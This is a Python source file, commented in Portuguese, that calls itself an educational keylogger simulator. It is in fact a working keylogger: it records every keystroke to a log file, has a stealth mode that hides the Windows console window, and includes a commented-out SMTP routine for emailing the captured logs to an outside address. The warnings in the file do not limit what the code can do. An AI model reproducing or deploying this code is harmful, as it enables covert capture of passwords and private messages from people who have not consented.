# keylogger_sim.py
import os
import sys
import time
import threading
from datetime import datetime
from pynput import keyboard

class KeyloggerSimulado:
    """
    SIMULADOR EDUCACIONAL DE KEYLOGGER
    - Captura teclas em ambiente controlado
    - Demonstra técnicas furtivas
    - NUNCA use este código em sistemas reais sem permissão!
    """
    
    def __init__(self, arquivo_log="logs/teclas_capturadas.txt", furtivo=True):
        self.arquivo_log = arquivo_log
        self.furtivo = furtivo
        self.teclas_pressionadas = []
        self.contador = 0
        self.temporizador = None
        self.intervalo_envio = 60  # segundos
        
        # Cria diretório de logs
        os.makedirs(os.path.dirname(arquivo_log), exist_ok=True)
        
        # Caracteres especiais mapeados
        self.teclas_especiais = {
            keyboard.Key.space: ' ',
            keyboard.Key.enter: '\n[ENTER]\n',
            keyboard.Key.tab: '\t',
            keyboard.Key.shift: '[SHIFT]',
            keyboard.Key.ctrl_l: '[CTRL]',
            keyboard.Key.alt_l: '[ALT]',
            keyboard.Key.backspace: '[BACKSPACE]',
            keyboard.Key.delete: '[DEL]',
            keyboard.Key.esc: '[ESC]',
            keyboard.Key.up: '[↑]',
            keyboard.Key.down: '[↓]',
            keyboard.Key.left: '[←]',
            keyboard.Key.right: '[→]',
        }
        
    def iniciar_furtividade(self):
        """Técnicas para tornar o keylogger mais furtivo"""
        if self.furtivo:
            # No Windows, isso seria mais sofisticado
            # Para fins educacionais, vamos apenas:
            
            # 1. Alterar nome do processo (simulado)
            # 2. Executar em background (via daemon)
            # 3. Esconder janela do console (no Windows)
            
            if sys.platform == "win32":
                # Esconde a janela do console no Windows
                import ctypes
                ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
            
            print("[*] Modo furtivo ativado - O keylogger está rodando em background")
    
    def formatar_tecla(self, tecla):
        """Formata a tecla para salvar no log"""
        try:
            # Tecla normal (letra/número)
            if hasattr(tecla, 'char') and tecla.char is not None:
                return tecla.char
            else:
                # Tecla especial
                return self.teclas_especiais.get(tecla, f'[{str(tecla)}]')
        except:
            return f'[{tecla}]'
    
    def salvar_log(self):
        """Salva as teclas capturadas em arquivo"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        with open(self.arquivo_log, 'a', encoding='utf-8') as f:
            f.write(f"\n[SESSION {timestamp}]\n")
            f.write(''.join(self.teclas_pressionadas))
            f.write("\n" + "="*50 + "\n")
        
        # Limpa o buffer atual
        self.teclas_pressionadas = []
    
    def adicionar_tecla(self, tecla):
        """Adiciona tecla ao buffer"""
        tecla_formatada = self.formatar_tecla(tecla)
        self.teclas_pressionadas.append(tecla_formatada)
        self.contador += 1
        
        # Salva automaticamente a cada 50 teclas
        if self.contador >= 50:
            self.salvar_log()
            self.contador = 0
    
    def on_press(self, tecla):
        """Callback quando tecla é pressionada"""
        try:
            self.adicionar_tecla(tecla)
            
            # Exibe no console apenas se não estiver em modo furtivo
            if not self.furtivo:
                print(f"Capturado: {self.formatar_tecla(tecla)}")
                
        except Exception as e:
            print(f"Erro ao capturar tecla: {e}")
    
    def on_release(self, tecla):
        """Callback quando tecla é solta"""
        # Para o keylogger quando ESC for pressionado 3 vezes seguidas
        if tecla == keyboard.Key.esc:
            # Contagem de ESC (simplificada)
            if not hasattr(self, 'esc_count'):
                self.esc_count = 0
            self.esc_count += 1
            if self.esc_count >= 3:
                print("\n[*] Encerrando keylogger...")
                return False
        return True
    
    def iniciar_monitoramento(self):
        """Inicia a captura de teclas"""
        print("="*60)
        print("⌨️  SIMULADOR DE KEYLOGGER - AMBIENTE CONTROLADO ⌨️")
        print("="*60)
        print(f"\n📁 Logs salvos em: {self.arquivo_log}")
        print("🔴 Capturando teclas...")
        print("💡 Pressione 'ESC' 3 vezes para encerrar\n")
        
        # Inicia técnicas furtivas
        self.iniciar_furtividade()
        
        # Inicia o listener do teclado
        with keyboard.Listener(
            on_press=self.on_press,
            on_release=self.on_release
        ) as listener:
            listener.join()
        
        # Salva o que restou no buffer
        if self.teclas_pressionadas:
            self.salvar_log()
        
        print(f"\n✅ Keylogger finalizado. Log salvo em {self.arquivo_log}")
    
    def enviar_por_email(self, email_destino, senha_aplicativo):
        """SIMULAÇÃO: Envio de logs por email (NÃO implementar em produção)"""
        print("\n📧 SIMULAÇÃO DE ENVIO POR EMAIL")
        print("Em um cenário real, os logs seriam enviados para:", email_destino)
        print("Para fins educacionais, isso NÃO foi implementado.")
        print("⚠️ Nunca implemente envio automático de dados capturados!")
        
        # Código real seria algo como:
        """
        import smtplib
        from email.mime.text import MIMEText
        
        with open(self.arquivo_log, 'r') as f:
            conteudo = f.read()
        
        msg = MIMEText(conteudo)
        msg['Subject'] = f'Keylog Report - {datetime.now()}'
        msg['From'] = email_remetente
        msg['To'] = email_destino
        
        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
            server.login(email_remetente, senha_aplicativo)
            server.send_message(msg)
        """

def menu_keylogger():
    """Menu interativo para o keylogger simulado"""
    print("\n" + "="*50)
    print("     KEYLOGGER SIMULADO - MENU")
    print("="*50)
    print("1. Executar em modo visível (educacional)")
    print("2. Executar em modo furtivo (simulação)")
    print("3. Ver logs capturados")
    print("4. Limpar logs")
    print("5. Sair")
    print("="*50)
    
    opcao = input("\nEscolha uma opção: ")
    
    if opcao == "1":
        keylog = KeyloggerSimulado(furtivo=False)
        keylog.iniciar_monitoramento()
    elif opcao == "2":
        print("\n⚠️  Modo furtivo ativado para SIMULAÇÃO")
        print("O keylogger rodará em background. Pressione ESC 3x para parar.")
        input("Pressione Enter para continuar...")
        keylog = KeyloggerSimulado(furtivo=True)
        keylog.iniciar_monitoramento()
    elif opcao == "3":
        if os.path.exists("logs/teclas_capturadas.txt"):
            with open("logs/teclas_capturadas.txt", 'r', encoding='utf-8') as f:
                print("\n" + f.read())
        else:
            print("\n📭 Nenhum log encontrado.")
    elif opcao == "4":
        if os.path.exists("logs/teclas_capturadas.txt"):
            os.remove("logs/teclas_capturadas.txt")
            print("\n✅ Logs limpos com sucesso!")
        else:
            print("\n📭 Nenhum log para limpar.")
    elif opcao == "5":
        print("Saindo...")
        sys.exit(0)
    else:
        print("Opção inválida!")

if __name__ == "__main__":
    while True:
        menu_keylogger()